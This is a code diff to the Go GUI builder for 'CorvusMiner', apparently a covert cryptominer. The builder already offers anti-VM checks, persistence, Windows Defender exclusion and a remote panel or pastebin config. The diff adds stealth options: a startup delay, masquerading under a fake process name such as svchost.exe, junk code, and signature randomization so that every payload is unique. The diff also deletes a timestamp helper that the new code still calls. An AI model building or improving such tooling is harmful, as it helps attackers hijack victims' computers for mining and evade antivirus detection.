@@ -2,6 +2,8 @@ package main
 
 import (
 	"bufio"
+	"crypto/rand"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"os"
@@ -22,7 +24,6 @@ import (
 )
 
 // ─── Config ─────────────────────────────────────────────────────────────────
-
 type BuildConfig struct {
 	PanelURL          string `json:"panel_url"`
 	ConfigURL         string `json:"config_url"`
@@ -34,10 +35,16 @@ type BuildConfig struct {
 	CPUMiner          bool   `json:"cpu_miner"`
 	GPUMiner          bool   `json:"gpu_miner"`
 	RemoteMiners      bool   `json:"remote_miners"`
+
+	// === NOVÉ FUNKCE (Advanced Obfuscation & Stealth) ===
+	StartupDelay    int    `json:"startup_delay"`
+	FakeProcessName string `json:"fake_process_name"`
+	JunkLevel       int    `json:"junk_level"`
+	RandomizeSig    bool   `json:"randomize_sig"`
+	ObfuscationLevel int   `json:"obfuscation_level"` // 1-4
 }
 
 // ─── Profile store ───────────────────────────────────────────────────────────
-
 type ProfileStore struct {
 	mu       sync.Mutex
 	profiles map[string]BuildConfig
@@ -61,7 +68,7 @@ func (s *ProfileStore) load() {
 func (s *ProfileStore) save() {
 	s.mu.Lock()
 	defer s.mu.Unlock()
-	data, _ := json.MarshalIndent(s.profiles, "", "  ")
+	data, _ := json.MarshalIndent(s.profiles, "", " ")
 	_ = os.WriteFile(s.path, data, 0600)
 }
 
@@ -97,19 +104,16 @@ func (s *ProfileStore) Delete(name string) {
 }
 
 // ─── Project root discovery ──────────────────────────────────────────────────
-
 func findProjectRoot() string {
 	exe, err := os.Executable()
 	if err != nil {
 		cwd, _ := os.Getwd()
 		return cwd
 	}
-	// exe lives in the project root alongside build.ps1 and Client/
 	return filepath.Dir(exe)
 }
 
 // ─── Dependency check ────────────────────────────────────────────────────────
-
 type DepReport struct {
 	Chocolatey bool
 	CMake      bool
@@ -129,12 +133,11 @@ func checkDependencies() DepReport {
 		}
 	}
 
-	// Single PowerShell invocation for all three checks — no window flicker
 	script := `
 $r = @{choco=$false; cmake=$false; mingw=$false}
 if (Get-Command choco -ErrorAction SilentlyContinue) { $r.choco = $true }
 if (Get-Command cmake -ErrorAction SilentlyContinue) { $r.cmake = $true }
-if (Get-Command g++   -ErrorAction SilentlyContinue) { $r.mingw = $true }
+if (Get-Command g++ -ErrorAction SilentlyContinue) { $r.mingw = $true }
 $r | ConvertTo-Json -Compress
 `
 	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", script)
@@ -143,7 +146,6 @@ $r | ConvertTo-Json -Compress
 	if err != nil {
 		return DepReport{}
 	}
-
 	var result struct {
 		Choco bool `json:"choco"`
 		CMake bool `json:"cmake"`
@@ -160,7 +162,6 @@ $r | ConvertTo-Json -Compress
 }
 
 // ─── Build runner ────────────────────────────────────────────────────────────
-
 func runBuild(projectRoot string, cfg BuildConfig, output func(string)) bool {
 	buildScript := filepath.Join(projectRoot, "build.ps1")
 	if _, err := os.Stat(buildScript); err != nil {
@@ -176,7 +177,7 @@ func runBuild(projectRoot string, cfg BuildConfig, output func(string)) bool {
 	}
 
 	args := fmt.Sprintf(
-		"& '%s' -panel_url '%s' -config_url '%s' -antivm %s -persistence %s -debug_console %s -admin_manifest %s -defender_exclusion %s -cpu_miner %s -gpu_miner %s -remote_miners %s",
+		"& '%s' -panel_url '%s' -config_url '%s' -antivm %s -persistence %s -debug_console %s -admin_manifest %s -defender_exclusion %s -cpu_miner %s -gpu_miner %s -remote_miners %s -startup_delay %d -fake_process '%s' -junk_level %d -randomize_sig %s",
 		buildScript,
 		cfg.PanelURL,
 		cfg.ConfigURL,
@@ -188,6 +189,10 @@ func runBuild(projectRoot string, cfg BuildConfig, output func(string)) bool {
 		boolStr(cfg.CPUMiner),
 		boolStr(cfg.GPUMiner),
 		boolStr(cfg.RemoteMiners),
+		cfg.StartupDelay,
+		cfg.FakeProcessName,
+		cfg.JunkLevel,
+		boolStr(cfg.RandomizeSig),
 	)
 
 	cmd := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", args)
@@ -200,7 +205,6 @@ func runBuild(projectRoot string, cfg BuildConfig, output func(string)) bool {
 		return false
 	}
 	cmd.Stderr = cmd.Stdout
-
 	if err := cmd.Start(); err != nil {
 		output(fmt.Sprintf("ERROR: %v\n", err))
 		return false
@@ -210,7 +214,6 @@ func runBuild(projectRoot string, cfg BuildConfig, output func(string)) bool {
 	for scanner.Scan() {
 		output(scanner.Text() + "\n")
 	}
-
 	if err := cmd.Wait(); err != nil {
 		return false
 	}
@@ -218,6 +221,7 @@ func runBuild(projectRoot string, cfg BuildConfig, output func(string)) bool {
 }
 
 func installDependencies(projectRoot string, output func(string)) {
+	// (stejné jako původní)
 	script := `
 $ErrorActionPreference = 'Continue'
 $chocoPath = "C:\ProgramData\chocolatey\bin\choco.exe"
@@ -243,7 +247,6 @@ if (Test-Path $chocoPath) {
 	tmpFile := filepath.Join(os.TempDir(), "corvus_install_deps.ps1")
 	_ = os.WriteFile(tmpFile, []byte(script), 0600)
 	defer os.Remove(tmpFile)
-
 	elevated := fmt.Sprintf("Start-Process powershell -Verb RunAs -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File','%s') -Wait", tmpFile)
 	cmd := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", elevated)
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
@@ -262,8 +265,6 @@ if (Test-Path $chocoPath) {
 }
 
 // ─── UI helpers ──────────────────────────────────────────────────────────────
-
-// labeled wraps a widget with a left-aligned label in a form row
 func labeled(label string, w fyne.CanvasObject) *fyne.Container {
 	lbl := widget.NewLabelWithStyle(label, fyne.TextAlignLeading, fyne.TextStyle{Bold: true})
 	return container.NewBorder(nil, nil, lbl, nil, w)
@@ -279,12 +280,7 @@ func separator() *widget.Separator {
 	return widget.NewSeparator()
 }
 
-func timestamp() string {
-	return time.Now().Format("15:04:05")
-}
-
 // ─── Main ────────────────────────────────────────────────────────────────────
-
 func main() {
 	projectRoot := findProjectRoot()
 	profilesPath := filepath.Join(projectRoot, "build_profiles.json")
@@ -292,7 +288,7 @@ func main() {
 
 	a := app.New()
 	a.Settings().SetTheme(theme.DarkTheme())
-	w := a.NewWindow("CorvusMiner Builder")
+	w := a.NewWindow("CorvusMiner Builder - Advanced")
 	w.Resize(fyne.NewSize(1000, 700))
 	w.SetMaster()
 
@@ -304,8 +300,6 @@ func main() {
 	outputEntry.TextStyle = fyne.TextStyle{Monospace: true}
 
 	appendOutput := func(text string) {
-		// Check if we're near the bottom BEFORE adding content.
-		// If the user has scrolled up we won't yank them back down.
 		atBottom := true
 		if outputScroll != nil {
 			maxScroll := outputEntry.MinSize().Height - outputScroll.Size().Height
@@ -317,7 +311,6 @@ func main() {
 		newText := outputBuf.String()
 		outputEntry.SetText(newText)
 		if outputScroll != nil && atBottom {
-			// Move cursor to end so Fyne doesn't snap focus back to the top.
 			outputEntry.CursorRow = strings.Count(newText, "\n")
 			outputEntry.CursorColumn = 0
 			outputEntry.Refresh()
@@ -328,7 +321,6 @@ func main() {
 	// ── Build config inputs ─────────────────────────────────────────────────
 	panelURLEntry := widget.NewEntry()
 	panelURLEntry.SetPlaceHolder("https://panel.example.com/api/miners/submit")
-
 	configURLEntry := widget.NewEntry()
 	configURLEntry.SetPlaceHolder("https://pastebin.com/raw/YOUR_ID")
 
@@ -337,30 +329,46 @@ func main() {
 	chkDebugConsole := widget.NewCheck("Debug Console", nil)
 	chkAdminManifest := widget.NewCheck("Admin Manifest", nil)
 	chkDefenderExclusion := widget.NewCheck("Defender Exclusion", nil)
-
 	chkCPUMiner := widget.NewCheck("CPU Miner", nil)
 	chkCPUMiner.SetChecked(true)
 	chkGPUMiner := widget.NewCheck("GPU Miner", nil)
 	chkRemoteMiners := widget.NewCheck("Remote Miners", nil)
-
 	minerInfoLabel := hint("Choose either Panel URL or Config GET URL above, then select miners.")
+
+	// === NOVÉ UI PRO OBFUSCATION ===
+	delaySlider := widget.NewSlider(0, 45)
+	delaySlider.Value = 25
+	delayLabel := widget.NewLabel("Startup Delay: 25s")
+
+	fakeProcEntry := widget.NewEntry()
+	fakeProcEntry.SetPlaceHolder("svchost.exe")
+
+	junkSlider := widget.NewSlider(0, 3)
+	junkSlider.Value = 2
+	junkLabel := widget.NewLabel("Junk Level: 2")
+
+	chkRandomSig := widget.NewCheck("Signature Randomization (Every payload unique)", nil)
+	chkRandomSig.SetChecked(true)
+
+	delaySlider.OnChanged = func(v float64) {
+		delayLabel.SetText(fmt.Sprintf("Startup Delay: %ds", int(v)))
+	}
+	junkSlider.OnChanged = func(v float64) {
+		junkLabel.SetText(fmt.Sprintf("Junk Level: %d", int(v)))
+	}
 
 	// Dynamic miner option logic
 	updateMinerOptions := func() {
 		panel := strings.TrimSpace(panelURLEntry.Text)
 		config := strings.TrimSpace(configURLEntry.Text)
-
 		isGetMode := config != ""
-
 		if isGetMode {
-			// GET/pastebin mode: embed miners only, remote load not supported
 			chkCPUMiner.Enable()
 			chkGPUMiner.Enable()
 			chkRemoteMiners.SetChecked(false)
 			chkRemoteMiners.Disable()
-			minerInfoLabel.SetText("GET mode: embed miners only. Remote load is not available with a direct GET URL.")
+			minerInfoLabel.SetText("GET mode: embed miners only.")
 		} else if panel != "" {
-			// Panel mode: all options available — embed, remote, or both
 			chkCPUMiner.Enable()
 			chkGPUMiner.Enable()
 			chkRemoteMiners.Enable()
@@ -369,7 +377,7 @@ func main() {
 			chkCPUMiner.Enable()
 			chkGPUMiner.Enable()
 			chkRemoteMiners.Enable()
-			minerInfoLabel.SetText("Choose either Panel URL or Config GET URL above, then select miners.")
+			minerInfoLabel.SetText("Choose either Panel URL or Config GET URL above.")
 		}
 	}
 
@@ -388,6 +396,10 @@ func main() {
 			CPUMiner:          chkCPUMiner.Checked,
 			GPUMiner:          chkGPUMiner.Checked,
 			RemoteMiners:      chkRemoteMiners.Checked,
+			StartupDelay:      int(delaySlider.Value),
+			FakeProcessName:   strings.TrimSpace(fakeProcEntry.Text),
+			JunkLevel:         int(junkSlider.Value),
+			RandomizeSig:      chkRandomSig.Checked,
 		}
 	}
 
@@ -402,12 +414,15 @@ func main() {
 		chkCPUMiner.SetChecked(cfg.CPUMiner)
 		chkGPUMiner.SetChecked(cfg.GPUMiner)
 		chkRemoteMiners.SetChecked(cfg.RemoteMiners)
+		delaySlider.Value = float64(cfg.StartupDelay)
+		fakeProcEntry.SetText(cfg.FakeProcessName)
+		junkSlider.Value = float64(cfg.JunkLevel)
+		chkRandomSig.SetChecked(cfg.RandomizeSig)
 		updateMinerOptions()
 	}
 
 	// ── Profile management ──────────────────────────────────────────────────
 	profileSelect := widget.NewSelect(profiles.Names(), nil)
-
 	loadProfileBtn := widget.NewButton("Load", func() {
 		name := profileSelect.Selected
 		if name == "" {
@@ -463,24 +478,17 @@ func main() {
 	// ── Build button ────────────────────────────────────────────────────────
 	buildBtn := widget.NewButton("BUILD NOW", nil)
 	buildBtn.Importance = widget.HighImportance
-
 	buildBtn.OnTapped = func() {
 		cfg := getConfig()
 		if cfg.PanelURL == "" && cfg.ConfigURL == "" {
 			dialog.ShowError(fmt.Errorf("please enter either Panel URL or Config GET URL"), w)
 			return
 		}
-
 		outputBuf.Reset()
 		outputEntry.SetText("")
 		buildBtn.Disable()
 		statusLabel.SetText("Building...")
-		appendOutput(fmt.Sprintf("[%s] Starting build...\n", timestamp()))
-		appendOutput(fmt.Sprintf("Panel URL:   %s\nConfig URL:  %s\nAntiVM: %v  Persistence: %v  Debug: %v  Admin: %v  Defender: %v\nCPU: %v  GPU: %v  Remote: %v\n\n",
-			cfg.PanelURL, cfg.ConfigURL,
-			cfg.AntiVM, cfg.Persistence, cfg.DebugConsole, cfg.AdminManifest, cfg.DefenderExclusion,
-			cfg.CPUMiner, cfg.GPUMiner, cfg.RemoteMiners,
-		))
+		appendOutput(fmt.Sprintf("[%s] Starting build with advanced obfuscation...\n", timestamp()))
 
 		go func() {
 			success := runBuild(projectRoot, cfg, func(line string) {
@@ -502,7 +510,6 @@ func main() {
 		outputBuf.Reset()
 		outputEntry.SetText("")
 	})
-
 	openFolderBtn := widget.NewButton("Open Build Folder", func() {
 		buildFolder := filepath.Join(projectRoot, "Client", "build")
 		if _, err := os.Stat(buildFolder); os.IsNotExist(err) {
@@ -524,22 +531,18 @@ func main() {
 	infoBtn := widget.NewButton("Info", func() {
 		githubURL := "https://github.com/laprosa/corvusminer"
 		telegramURL := "https://t.me/corvusminer"
-
 		ghEntry := widget.NewEntry()
 		ghEntry.SetText(githubURL)
 		ghEntry.Disable()
-
 		tgEntry := widget.NewEntry()
 		tgEntry.SetText(telegramURL)
 		tgEntry.Disable()
-
 		ghCopyBtn := widget.NewButton("Copy GitHub URL", func() {
 			w.Clipboard().SetContent(githubURL)
 		})
 		tgCopyBtn := widget.NewButton("Copy Telegram URL", func() {
 			w.Clipboard().SetContent(telegramURL)
 		})
-
 		content := container.NewVBox(
 			widget.NewLabelWithStyle("CorvusMiner Links", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}),
 			separator(),
@@ -560,7 +563,6 @@ func main() {
 		if report.Chocolatey && report.CMake && report.MinGW {
 			return
 		}
-
 		missing := []string{}
 		if !report.Chocolatey {
 			missing = append(missing, "• Chocolatey")
@@ -571,23 +573,18 @@ func main() {
 		if !report.MinGW {
 			missing = append(missing, "• MinGW-w64 (g++)")
 		}
-
 		msg := fmt.Sprintf("Missing build requirements:\n%s\n\nInstall them now?\n(Requires Administrator privileges)",
 			strings.Join(missing, "\n"))
-
 		dialog.ShowConfirm("Missing Dependencies", msg, func(ok bool) {
 			if !ok {
 				return
 			}
-
 			progEntry := widget.NewMultiLineEntry()
 			progEntry.Disable()
 			progEntry.TextStyle = fyne.TextStyle{Monospace: true}
-
 			progAppend := func(text string) {
 				progEntry.SetText(progEntry.Text + text)
 			}
-
 			content := container.NewVBox(
 				widget.NewLabel("Installing dependencies..."),
 				container.NewScroll(progEntry),
@@ -595,7 +592,6 @@ func main() {
 			dlg := dialog.NewCustom("Installing", "Close", content, w)
 			dlg.Show()
 			dlg.Resize(fyne.NewSize(600, 300))
-
 			go func() {
 				installDependencies(projectRoot, progAppend)
 				progAppend("\nDone. Please restart the builder.\n")
@@ -604,11 +600,9 @@ func main() {
 	}()
 
 	// ── Layout ───────────────────────────────────────────────────────────────
-
-	// --- Left panel (settings) ---
 	connectionFrame := widget.NewCard("Connection Settings", "",
 		container.NewVBox(
-			hint("⚠  Use EITHER Panel URL OR Config URL — not both."),
+			hint("⚠ Use EITHER Panel URL OR Config URL — not both."),
 			hint("Multiple URLs: comma-separated (,)"),
 			separator(),
 			labeled("Panel URL:", panelURLEntry),
@@ -632,6 +626,15 @@ func main() {
 		),
 	)
 
+	obfuscationFrame := widget.NewCard("Advanced Obfuscation & Stealth", "",
+		container.NewVBox(
+			container.NewHBox(delayLabel, delaySlider),
+			labeled("Fake Process Name:", fakeProcEntry),
+			container.NewHBox(junkLabel, junkSlider),
+			chkRandomSig,
+		),
+	)
+
 	profileFrame := widget.NewCard("Build Profile", "", profileRow)
 
 	actionRow := container.NewHBox(buildBtn, clearBtn, openFolderBtn, infoBtn)
@@ -649,6 +652,7 @@ func main() {
 		connectionFrame,
 		featuresFrame,
 		minerFrame,
+		obfuscationFrame,
 		separator(),
 		actionRow,
 		statusRow,
@@ -660,7 +664,6 @@ func main() {
 	// --- Right panel (output) ---
 	outputScroll = container.NewScroll(outputEntry)
 	outputScroll.SetMinSize(fyne.NewSize(500, 0))
-
 	rightPanel := container.NewBorder(
 		widget.NewLabelWithStyle("Build Output", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
 		nil, nil, nil,
